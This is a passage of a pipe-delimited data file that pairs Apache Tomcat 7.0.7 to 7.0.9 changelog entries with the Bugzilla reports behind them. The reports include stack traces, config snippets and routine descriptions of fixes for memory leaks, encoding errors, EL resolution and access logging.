STARTED, MUST_STOP"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50836
Coyote|Tomcat 7.0.9 (markt)|fix|50780|Fix memory leak in APR implementation of AJP connector introduced by the refactoring for 49884. (markt)|AjpConnectionHandler keeps many connections causing memory leak|"Hi,

Sorry for my english.

I use Tomcat 7.0.6 with APR 1.1.20. 

I noticed (from heap dump) many org.apache.tomcat.util.net.SocketWrapper objects, which are kept by ""connections"" atribute in org.apache.coyote.ajp.AjpAprProtocol$AjpConnectionHandler object. I don't understand, why there are so many objects representing old connections which are not active. In my example it was 300000 objects created, after 7 days of Tomcat work. Has someone forgotten to clean this HashMap from time to time?

best regards

Sergiusz Brzezinski"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50780
Coyote|Tomcat 7.0.9 (markt)|fix||If server configuration errors and/or faulty applications caused the ulimit for open files to be reached, the acceptor threads for all connectors could enter a tight loop. This loop consumed CPU and also logged an error message for every iteration of the loop which lead to large log files being generated. The acceptors have been enhanced to better handle this situation. (markt)|||
Jasper|Tomcat 7.0.9 (markt)|fix|50720|Ensure that the use of non-ISO-8859-1 character sets for web.xml does not trigger an error when Jasper parses the web.xml file. (markt)|When using jsp mapped as servlet in web.xml, cyrillic characters are not allowed in web.xml|"Created attachment 26605 [details]
Simple test web application

I am using web.xml in it simplest, incomlete form (note that making it
100% Servlet API 3.0 compliant does not help)

<?xml version=""1.0"" encoding=""Windows-1251""?>
<web-app>
<!-- below are word testing Testoviy in cyrillic, try to use another symbols -->
<display-name>–¢–µ—Å—Ç–æ–≤—ã–π web.xml</display-name>
<servlet>
<servlet-name>TestJSPMount</servlet-name>
<jsp-file>/test.jsp</jsp-file>
</servlet>
<servlet-mapping>
<servlet-name>TestJSPMount</servlet-name>
<url-pattern>/test.html</url-pattern>
</servlet-mapping>
</web-app>

During startup, tomcat throws exception:
04/02/2011 16:07:39 S - - StandardContext.loadOnStartup: Servlet
/testcyrwebxml threw load() exception
com.sun.org.apache.xerces.internal.impl.io.MalformedByteSequenceException:
Invalid byte 2 of 2-byte UTF-8 sequence.
       at com.sun.org.apache.xerces.internal.impl.io.UTF8Reader.invalidByte(Unknown
Source)
       at com.sun.org.apache.xerces.internal.impl.io.UTF8Reader.read(Unknown Source)
       at com.sun.org.apache.xerces.internal.impl.XMLEntityScanner.load(Unknown
Source)
       at com.sun.org.apache.xerces.internal.impl.XMLEntityScanner.peekChar(Unknown
Source)
       at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(Unknown
Source)
       at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(Unknown
Source)
       at com.sun.org.apache.xerces.internal.impl.XMLNSDocumentScannerImpl.next(Unknown
Source)
       at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(Unknown
Source)
       at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown
Source)
       at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(Unknown
Source)
       at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(Unknown Source)
       at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(Unknown Source)
       at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(Unknown
Source)
       at org.apache.jasper.xmlparser.ParserUtils.parseXMLDocument(ParserUtils.java:96)
       at org.apache.jasper.compiler.JspConfig.processWebDotXml(JspConfig.java:83)
       at org.apache.jasper.compiler.JspConfig.init(JspConfig.java:231)
       at org.apache.jasper.compiler.JspConfig.findJspProperty(JspConfig.java:290)
       at org.apache.jasper.compiler.Compiler.generateJava(Compiler.java:113)
       at org.apache.jasper.compiler.Compiler.compile(Compiler.java:365)
       at org.apache.jasper.compiler.Compiler.compile(Compiler.java:345)
       at org.apache.jasper.compiler.Compiler.compile(Compiler.java:332)
       at org.apache.jasper.JspCompilationContext.compile(JspCompilationContext.java:594)
       at org.apache.jasper.servlet.JspServletWrapper.service(JspServletWrapper.java:342)
       at org.apache.jasper.servlet.JspServlet.serviceJspFile(JspServlet.java:391)
       at org.apache.jasper.servlet.JspServlet.init(JspServlet.java:128)
       at org.apache.catalina.core.StandardWrapper.initServlet(StandardWrapper.java:1133)
       at org.apache.catalina.core.StandardWrapper.loadServlet(StandardWrapper.java:1087)
       at org.apache.catalina.core.StandardWrapper.load(StandardWrapper.java:996)
       at org.apache.catalina.core.StandardContext.loadOnStartup(StandardContext.java:4741)
       at org.apache.catalina.core.StandardContext$3.call(StandardContext.java:5062)
       at org.apache.catalina.core.StandardContext$3.call(StandardContext.java:5057)
       at java.util.concurrent.FutureTask$Sync.innerRun(Unknown Source)
       at java.util.concurrent.FutureTask.run(Unknown Source)
       at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(Unknown Source)
       at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
       at java.lang.Thread.run(Unknown Source)

Platform in use:

Tomcat 7.0.6 binary windows release
JDK 1.6.0_18 x86
Windows 7 x64

If I change encoding of web.xml to UTF-8 it does not help also.
The only fix for this problem is to use only ISO-8859-1 characters.

I believe it is somehow related to some early initialization sequence,
when jsp is mapped as servlet."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50720
Jasper|Tomcat 7.0.9 (markt)|fix|50726|Ensure that the use of the genStringAsCharArray does not result in String constants that are too long for valid Java code. (markt)|Jasper can generate uncompilable source code if genStringAsCharArray is turned on|"Our jsp pages are compiled at build time. If I turn on genStringAsCharArray optimization switch, in some cases there will be longer lines in the generated java code than the javac compiler can process. It provides the following error message:

[javac] Compiling 1609 source files to d:\...\jspc\classes
[javac] d:\...\jspc\src\org\apache\jsp\WEB_002dINF\..._005fAPP\pages\termsconditions\TermsAndConditions_005fms_005fMY_jsp.java:96: constant string too long"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50726
Jasper|Tomcat 7.0.9 (markt)|fix|50790|Improve method resolution in EL expressions. (markt)|EL parser needs to be more dynamic|"String.containes(CharSequence) is not being resolved correctly in the following situation:

<span class=""#{(facesContext.externalContext.request.requestURI.contains(item.url)) ? 'activepage' : ''}"">#{template[item.labelKey]}</span>

Exception:


javax.el.ELException: /faces/template/mainLayout.xhtml: java.lang.NoSuchMethodException: java.lang.String.contains(java.lang.String)
	at com.sun.faces.facelets.compiler.AttributeInstruction.write(AttributeInstruction.java:87)
	at com.sun.faces.facelets.compiler.UIInstructions.encodeBegin(UIInstructions.java:75)
	at com.sun.faces.renderkit.html_basic.HtmlBasicRenderer.encodeRecursive(HtmlBasicRenderer.java:285)
	at com.sun.faces.renderkit.html_basic.OutputLinkRenderer.encodeChildren(OutputLinkRenderer.java:125)
	at javax.faces.component.UIComponentBase.encodeChildren(UIComponentBase.java:848)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1613)
	at com.sun.faces.facelets.component.RepeatRenderer.encodeChildren(RepeatRenderer.java:97)
	at com.sun.faces.facelets.component.UIRepeat.process(UIRepeat.java:496)
	at com.sun.faces.facelets.component.UIRepeat.encodeChildren(UIRepeat.java:926)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1613)
	at javax.faces.render.Renderer.encodeChildren(Renderer.java:168)
	at javax.faces.component.UIComponentBase.encodeChildren(UIComponentBase.java:848)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1613)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1616)
	at javax.faces.component.UIComponent.encodeAll(UIComponent.java:1616)
	at com.sun.faces.application.view.FaceletViewHandlingStrategy.renderView(FaceletViewHandlingStrategy.java:380)
	at com.sun.faces.application.view.MultiViewHandler.renderView(MultiViewHandler.java:126)
	at com.ocpsoft.pretty.faces.application.PrettyViewHandler.renderView(PrettyViewHandler.java:157)
	at com.sun.faces.lifecycle.RenderResponsePhase.execute(RenderResponsePhase.java:127)
	at com.sun.faces.lifecycle.Phase.doPhase(Phase.java:101)
	at com.sun.faces.lifecycle.LifecycleImpl.render(LifecycleImpl.java:139)
	at javax.faces.webapp.FacesServlet.service(FacesServlet.java:313)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:306)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at com.reardeninc.tigris.ui.facesutil.FacesFilter.doFilter(FacesFilter.java:86)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:244)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.primefaces.webapp.filter.FileUploadFilter.doFilter(FileUploadFilter.java:79)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:244)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at com.ocpsoft.pretty.PrettyFilter.doFilter(PrettyFilter.java:100)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:244)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:240)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:496)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
	at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:541)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:383)
	at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:243)
	at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:188)
	at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:288)
	at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
	at java.lang.Thread.run(Thread.java:680)
Caused by: java.lang.NoSuchMethodException: java.lang.String.contains(java.lang.String)
	at java.lang.Class.getMethod(Class.java:1605)
	at javax.el.BeanELResolver.invoke(BeanELResolver.java:405)
	at javax.el.CompositeELResolver.invoke(CompositeELResolver.java:161)
	at org.apache.el.parser.AstValue.getValue(AstValue.java:159)
	at org.apache.el.parser.AstChoice.getValue(AstChoice.java:45)
	at org.apache.el.ValueExpressionImpl.getValue(ValueExpressionImpl.java:189)
	at com.sun.faces.facelets.el.ELText$ELTextVariable.toString(ELText.java:207)
	at com.sun.faces.facelets.compiler.AttributeInstruction.write(AttributeInstruction.java:82)
	... 46 more"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50790
Cluster|Tomcat 7.0.9 (markt)|fix|50771|Ensure HttpServletRequest#getAuthType() returns the name of the authentication scheme if request has already been authenticated. (kfujino)|HttpServletRequest#getAuthType() returns null though the request is authenticated.|"Created attachment 26648 [details]
I made a patch.

When Tomcat registers an authenticated Principal and authentication Type with current session, 
only authenticated Principal is replicated, and authentication Type is not replicated.
Therefore, Request#getAuthType() returns null though the request is authenticated when the node changed. 


Best Regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50771
Web applications|Tomcat 7.0.9 (markt)|fix|50713|Remove roles command from the Manager application. (markt)|"The ""roles"" command doesn't work"|"Created attachment 26601 [details]
patch for context.xml of the Manager application

The Manager application has the ""roles"" command that list the security role names. But now this command doesn't work correctly.

The ""roles"" command returns following message:
 FAIL - Cannot resolve user database reference
And gets Exception:
SEVERE: Manager: java:comp/env/users
javax.naming.NamingException: Cannot create resource instance
        at org.apache.naming.factory.ResourceEnvFactory.getObjectInstance(ResourceEnvFactory.java:117)
        at javax.naming.spi.NamingManager.getObjectInstance(NamingManager.java:304)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:826)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:145)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:814)
        at org.apache.naming.NamingContext.lookup(NamingContext.java:159)
        at org.apache.naming.SelectorContext.lookup(SelectorContext.java:158)
        at javax.naming.InitialContext.lookup(InitialContext.java:392)
        at org.apache.catalina.manager.ManagerServlet.roles(ManagerServlet.java:1055)
        at org.apache.catalina.manager.ManagerServlet.doGet(ManagerServlet.java:366)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:621)
        at javax.servlet.http.HttpServlet.service(HttpServlet.java:722)
        at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:306)
        at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:210)
        at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:240)
        at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:161)
        at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:589)
        at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:164)
        at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:100)
        at org.apache.catalina.valves.AccessLogValve.invoke(AccessLogValve.java:541)
        at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:118)
        at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:382)
        at org.apache.coyote.http11.Http11Processor.process(Http11Processor.java:243)
        at org.apache.coyote.http11.Http11Protocol$Http11ConnectionHandler.process(Http11Protocol.java:188)
        at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:288)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:619)

Tomcat 6.x contains same issue.

The workaround for this issue is to add <ResourceLink> to context.xml of the Manager application.
And I made the patch for this issue.

regards."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50713
Tribes|Tomcat 7.0.9 (markt)|fix||50667 (r1068549): Allow RPC callers to get confirmation when sending a reply. (fhanik)|"Tribes | RpcChannel | Add a callback for cases when an error occured sending a reply to an RP call"|"The RpcChannel API user registers an RpcCallback to be notified of
communication events. However, there is no callback method for the case where
the sending of a response message fails. This entry proposes the addition of a callback method for such cases.

CAVEAT: this proposal modifies the RpcCallback interface. RpcCallback is currently implemented by at least four tomcat classes, EchoRpcTest in org.apache.catalina.tribes.demos, and AbstractReplicatedMap, ReplicatedMap ad LazyReplicatedMap in org.apache.catalina.tribes.tipis. The attached patch does not include the implementation of the additional interface method for those classes, as this coder did not feel qualified to tell how it should be implemented. They could probably simply be NOOPs, however."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50667
Other|Tomcat 7.0.9 (markt)|fix|50743|Cache CheckStyle results between builds to speed up validation. Patch provided by Oliver. (markt)|Cache results to speed up Checkstyle #build|"Created attachment 26627 [details]
Patch to enable caching

Checkstyle supports caching files that have successfully passed with no errors, so that these files are not processed again on subsequent invocations of Checkstyle until the files are modified again. As the output below shows, this speeds up the Checkstyle from 51 seconds to 15 seconds.

The attached patch, based on trunk, adds support for caching Checkstyle results. The cache files are stored in the ${tomcat.output} directory, so are removed whenever an ""ant clean"" is performed.

You could get more sophisticated and store the cache files outside of the ${tomcat.output} directory to save history across ""ant clean"" invocations. In this case, you then need to make the build logic smarter to invalidate the cache files if any of the Checkstyle configuration files change. Let me know if you are interested in a patch to do this.

=======================================================
oliver@oliver-laptop tomcat-trunk]$ ant -q validate
     [echo] Testing  for /tmp/tomcat/checkstyle-5.1/checkstyle-all-5.1.jar
[checkstyle] /home/oliver/play/tomcat-trunk/java/org/apache/catalina/tribes/group/ExtendedRpcCallback.java:21:8: Unused import - org.apache.catalina.tribes.ErrorHandler.

BUILD FAILED
/home/oliver/play/tomcat-trunk/build.xml:430: Got 1 errors and 0 warnings.

Total time: 55 seconds
[oliver@oliver-laptop tomcat-trunk]$ ant -q validate
     [echo] Testing  for /tmp/tomcat/checkstyle-5.1/checkstyle-all-5.1.jar
[checkstyle] /home/oliver/play/tomcat-trunk/java/org/apache/catalina/tribes/group/ExtendedRpcCallback.java:21:8: Unused import - org.apache.catalina.tribes.ErrorHandler.

BUILD FAILED
/home/oliver/play/tomcat-trunk/build.xml:430: Got 1 errors and 0 warnings.

Total time: 15 seconds"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50743
Catalina|Tomcat 7.0.8 (markt)|fix||Fix NPE in CoyoteAdapter when postParseRequest() call fails. (kkolinko)|||
Catalina|Tomcat 7.0.8 (markt)|fix|50709|Make ApplicationContextFacade non-final to enable extension. (markt)|Make class org.apache.catalina.core.ApplicationContextFacade non-final|"Please make class org.apache.catalina.core.ApplicationContextFacade non-final so it can be subclassed.
Need to extend ApplicationContextFacade so Mobicents Sip Servlet, working on top of Tomcat 7, to integrate with Weld.

Thanks
George"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50709
Catalina|Tomcat 7.0.8 (markt)|fix||When running under a security manager, user requests may fail with a security exception. (markt)|||
Coyote|Tomcat 7.0.8 (markt)|fix||Reduce level of log message for invalid URL parameters from WARNING to INFO. (markt)|||
Coyote|Tomcat 7.0.8 (markt)|fix||Fix hanging Servlet 3 asynchronous requests when using the APR based AJP connector. (markt)|||
Other|Tomcat 7.0.8 (markt)|fix||Align server.xml installed by the Windows installer with the one bundled in zip/tar.gz files. The differences are LockOutRealm being used and AccessLogValve being enabled by default. (kkolinko)|||
Catalina|Tomcat 7.0.7 (markt)|fix|18462|Don't merge stdout and stderr internally so users retain the option to treat them separately. (markt)|System.err gets overriden to output to System.out|"I am using Eclipse to do my development and I am running tomcat 4.1.24 from 
within eclipse. One of the nice features of eclipse is that anything you 
display with System.out comes out in blue and anything you send to System.err 
is displayed in red. However when tomcat is running Catalina overrides 
System.err and makes it point to System.out. This is very inconvinient because 
its much harder to search for severe error messages in a list of millions of 
trivial ones."|https://bz.apache.org/bugzilla/show_bug.cgi?id=18462
Catalina|Tomcat 7.0.7 (markt)|add|18797|Provide protection against null or zero length names being provided for users, roles and groups in the MemoryRealm and UserDatabaseRealm. (markt)|MemoryUserRule doesn't validate user attributes|"The implementation of org.apache.catalina.realm.MemoryRuleSet.begin dosen't 
validate the attribute values before adding a user to the MemoryRealm. If 
username or name are not present then a null username is used which can cause 
odd problems later on.

Basically the method should check that parameters passed to MemoryRealm.addUser 
are not null before calling the method."|https://bz.apache.org/bugzilla/show_bug.cgi?id=18797
Catalina|Tomcat 7.0.7 (markt)|update||Improve fix for 50205 to trigger an error earlier if invalid configuration is used. (markt)|Add deployIgnorePaths attribute to StandardHost|"The attached patch adds a deployIgnorePaths attribute to StandardHost as I discussed with markt at ApacheConNA.  The attribute is a comma-separated list of regular expressions that will exclude files or directories under appBase from autoDepoy and deployOnStartup.  The host docs have been updated, and JMX get and set have been tested.

Why?  Here are a couple of use cases that this attribute can fix:

- CATALINA_BASE configuration is kept under version control.  For example, I keep all of my configuration in subversion.  This includes appBase which has svn:externals to pull in the application code.  So, appBase/.svn gets deployed.

- A context defined in server.xml but living in appBase will currently get double-deployed.  The recommendation is to move the app outside of appBase, but this attribute would allow it to live there with the instance's other apps."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50205
Catalina|Tomcat 7.0.7 (markt)|add||Provide additional control over component class loaders, primarily for use when embedding. (markt)|||
Catalina|Tomcat 7.0.7 (markt)|fix||Fix NPE in RemoteAddrFilter, RemoteHostFilter. (kkolinko)|||
Catalina|Tomcat 7.0.7 (markt)|fix|49711|"HttpServletRequest#getParts will work in a filter or servlet without an @MultipartConfig annotation or MultipartConfigElement if the new ""allowCasualMultipartParsing"" context attribute is set to ""true"". (schultz)"|HttpServletRequest#getParts() does not work in a Filter|"In order to have the ability to process multipart/form-data transparently with help of the new Servlet 3.0 HttpServletRequest#getParts(), a Filter is the most suitable place for this. 

This works fine in Glassfish v3. However, in Tomcat the getParts() returns null and it works only inside a servlet with @MultipartConfig annotation.

This is too strict. This makes it hard if not impossible to process multipart/form-data requests transparently with help of a Filter (i.e. creating a new parametermap and replacing the original one in HttpServletRequest).

It is true that the Servlet 3.0 spec tells nothing about the use of this method inside a Filter, but this is in my opinion an oversight. There is no other way to obtain the parts than parsing the stream yourself with good 'ol Apache Commons FileUpload.

Since it works fine in Glassfish v3, I'd suggest to make Tomcat 7 that lenient as well."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49711
Catalina|Tomcat 7.0.7 (markt)|fix|49978|Correct another instance where deployment incorrectly failed if a directory in the work area already existed. (markt)|WebappLoader throws exception if workDir already exists (when unpackWARs=false)|"In WebappLoader.setRepositories(), if the war is not unpacked, it tries to create a directory /WEB-INF/classes inside the workDir.  If that directory already exists, an error is thrown and the webapp does not start.

This is a change from 5.5, which didn't check the return value of classRepository.mkdirs().  mkdirs() returns false if the directories already exist.  I doubt it was the intention here.  Probably the intention was to throw an exception if the directory could not be created, rather than if it already existed."|https://bz.apache.org/bugzilla/show_bug.cgi?id=49978
Catalina|Tomcat 7.0.7 (markt)|fix|50582|Refactor access logging so chunked encoding is not forced for all requests if bytes sent is logged. (markt)|Small JSPs do not set Content-Length (and use chunked encoding) if AccessLogValve is configured|"Reported in the following thread on users@:
http://markmail.org/thread/awcu5ler2m77jjok

Steps to reproduce:
1. Create the following JSP page, simple.jsp:
<%= ""hello!"" %>

2. Send the following request:
GET /simple.jsp HTTP/1.1
Host: localhost
Keep-Alive: 115
Connection: keep-alive

3. Expected response: (Tomcat 7.0.4)
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=0AFC2875C06A962DF8A02DE6A780F721; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Content-Length: 6
Date: Thu, 13 Jan 2011 21:16:23 GMT

hello!

4. Actual response: (Tomcat 7.0.6)
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=2C176DBAC054D5BBF3D99FBE5C026915; Path=/; HttpOnly
Content-Type: text/html;charset=ISO-8859-1
Transfer-Encoding: chunked
Date: Thu, 13 Jan 2011 21:23:19 GMT

6
hello!
0

===============================================
Investigation.
If I place a breakpoint in AbstractHttp11Processor#prepareResponse() I see the following line
 long contentLength = response.getContentLengthLong();
returns -1 and the call stack is:

Daemon Thread [""http-bio-8080""-exec-1] (Suspended)	
	Response.getContentLengthLong() line: 523	
	Http11Processor(AbstractHttp11Processor).prepareResponse() line: 887	
	Http11Processor(AbstractHttp11Processor).action(ActionCode, Object) line: 739	
	Response.action(ActionCode, Object) line: 170	
	Response.sendHeaders() line: 350	
	OutputBuffer.doFlush(boolean) line: 308	
	OutputBuffer.flush() line: 291	
	Response.getBytesWritten(boolean) line: 327	
	AccessLogValve$ByteSentElement.addElement(StringBuilder, Date, Request, Response, long) line: 1052	
	AccessLogValve.log(Request, Response, long) line: 579	
	AccessLogValve.invoke(Request, Response) line: 562	
	StandardEngineValve.invoke(Request, Response) line: 118	
	CoyoteAdapter.service(Request, Response) line: 380	
	Http11Processor.process(SocketWrapper<Socket>) line: 243	
	Http11Protocol$Http11ConnectionHandler.process(SocketWrapper<Socket>, SocketStatus) line: 188	
	Http11Protocol$Http11ConnectionHandler.process(SocketWrapper<Socket>) line: 166	
	JIoEndpoint$SocketProcessor.run() line: 288	
	ThreadPoolExecutor$Worker.runTask(Runnable) line: 886	
	ThreadPoolExecutor$Worker.run() line: 908	
	TaskThread(Thread).run() line: 662	

Note OutputBuffer.flush() call above.


If I remove AccessLogValve from configuration, the response.getContentLengthLong();
call returns ""8"" as expected and call stack is:

Daemon Thread [""http-bio-8080""-exec-1] (Suspended)	
	Http11Processor(AbstractHttp11Processor).prepareResponse() line: 888	
	Http11Processor(AbstractHttp11Processor).action(ActionCode, Object) line: 739	
	Response.action(ActionCode, Object) line: 170	
	Response.sendHeaders() line: 350	
	OutputBuffer.doFlush(boolean) line: 308	
	OutputBuffer.close() line: 275	
	Response.finishResponse() line: 501	
	CoyoteAdapter.service(Request, Response) line: 406	
	Http11Processor.process(SocketWrapper<Socket>) line: 243	
	Http11Protocol$Http11ConnectionHandler.process(SocketWrapper<Socket>, SocketStatus) line: 188	
	Http11Protocol$Http11ConnectionHandler.process(SocketWrapper<Socket>) line: 166	
	JIoEndpoint$SocketProcessor.run() line: 288	
	ThreadPoolExecutor$Worker.runTask(Runnable) line: 886	
	ThreadPoolExecutor$Worker.run() line: 908	
	TaskThread(Thread).run() line: 662	

===============================================
The value returned by response.getContentLengthLong() should be set explicitly (e.g. with content-length header). The second stack trace includes OutputBuffer.close() call and it sets the length value to the response:

>   coyoteResponse.setContentLength(bb.getLength());


This regression is triggered by flushing when AccessLogValve asks for the count of bytes written and was introduced when implementing #50496."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50582
Catalina|Tomcat 7.0.7 (markt)|fix|50597|Don't instantiate a new instance of a Filter if an instance was provided via the ServletContext.addFilter(String, Filter) method. Patch provided by Ismael Juma. (markt)|Class.newInstance is used for Dynamic instance filters causing InstantiationException|"Class.newInstance is called even when the following method ServletContext.addFilter method is called:

javax.servlet.FilterRegistration.Dynamic addFilter(java.lang.String s, javax.servlet.Filter filter);

This leads to an InstantiationException at runtime if there is no no-args constructor for the filter (pasted below). I'll supply a simple patch that fixes the issue for me.

SEVERE: Exception starting filter testFilter
java.lang.InstantiationException: test.TestFilter
        at java.lang.Class.newInstance0(Class.java:340)
        at java.lang.Class.newInstance(Class.java:308)
        at org.apache.catalina.core.DefaultInstanceManager.newInstance(DefaultIn
stanceManager.java:119)
        at org.apache.catalina.core.ApplicationFilterConfig.getFilter(Applicatio
nFilterConfig.java:252)
        at org.apache.catalina.core.ApplicationFilterConfig.setFilterDef(Applica
tionFilterConfig.java:372)
        at org.apache.catalina.core.ApplicationFilterConfig.<init>(ApplicationFi
lterConfig.java:98)
        at org.apache.catalina.core.StandardContext.filterStart(StandardContext.
java:4382)
        at org.apache.catalina.core.StandardContext$2.call(StandardContext.java:
5040)
        at org.apache.catalina.core.StandardContext$2.call(StandardContext.java:5035)
        at java.util.concurrent.FutureTask$Sync.innerRun(FutureTask.java:303)
        at java.util.concurrent.FutureTask.run(FutureTask.java:138)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExecutor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:908)
        at java.lang.Thread.run(Thread.java:662)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=50597
Catalina|Tomcat 7.0.7 (markt)|fix|50598|Correct URL for Manager text interface. (markt)|Sample build.xml uses wrong manager.url|"In
http://tomcat.apache.org/tomcat-7.0-doc/appdev/build.xml.txt , referenced from http://tomcat.apache.org/tomcat-7.0-doc/appdev/processes.html 
sample manager.url is given as ""http://localhost:8080/manager"" but should be ""http://localhost:8080/manager/text"""|https://bz.apache.org/bugzilla/show_bug.cgi?id=50598
Catalina|Tomcat 7.0.7 (markt)|fix|50620|Stop exceptions that occur during Session.endAccess() from preventing the normal completion of Request.recycle(). (markt)|Session related errors prevent clean recycle of Request and Response objects by CoyoteAdapter|"Created attachment 26521 [details]
Patch created against tomcat/tc6.0.x/trunk

Session related errors prevent clean recycle of org.apache.catalina.connector.Request and org.apache.catalina.connector.Response objects by CoyoteAdapter. In org.apache.catalina.connector.Request.recycle() method, if an exception is thrown by session.endAccess() call, request object recycling aborts failing to cleanup fully and leaving the request object in inconsistent state. Further requests processed by CoyoteAdapter.service() using this inconsistent request object result in request being redirected to the last url that resulted in inconsistent request object which is still holding on to wrong session and contexts."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50620
Catalina|Tomcat 7.0.7 (markt)|fix|50629|Make StandardContext.bindThread() and StandardContext.unbindThread() protected to allow use by sub-classes. (markt)|Make the bindThread/unbindThread method protected|"In the latest Tomcat codes, I saw that a new thread is created for listener start, filter start and loadOnStartup. But the two methods bindThread and unbindThread is marked as private, how about making those methods protected ? So that other containers could use those two methods for their own initialization works.
Thanks."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50629
Catalina|Tomcat 7.0.7 (markt)|update||Use getName() instead of logName() in error messages in StandardContext. (kkolinko)|||
Catalina|Tomcat 7.0.7 (markt)|fix|50642|Move the sun.net.www.http.HttpClient keep-alive thread memory leak protection from the JreMemoryLeakPreventionListener to the WebappClassLoader since the thread that triggers the memory leak is created on demand. (markt)|keepAliveProtection doesn't work|"Created attachment 26541 [details]
ServletContextListener that removes the leaked ClassLoader reference

sun.net.www.http.HttpClient.kac.keepAliveTimer.contextClassLoader causes a memory leak as it references the webapp's classloader rather than Tomcat's.

JreMemoryLeakPreventionListener claims to fix this, but only loads sun.net.www.http.HttpClient and does not create the timer thread. Thus the leak still exists.

AFAICT, the attached listener does successfully prevent the leak."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50642
Catalina|Tomcat 7.0.7 (markt)|fix|50673|Improve Catalina shutdown when running as a service. Do not call System.exit(). (kkolinko)|Error when stopping Tomcat using services.msc|"When stopping Tomcat using services.msc, an error message is displayed: ""Windows could not stop the Apache Tomcat 7 service on Local Computer. Error 109: The pipe has been ended.""

Despite this error, Tomcat appears to stop normally.

No such problem was encountered in 6.0.29."|https://bz.apache.org/bugzilla/show_bug.cgi?id=50673
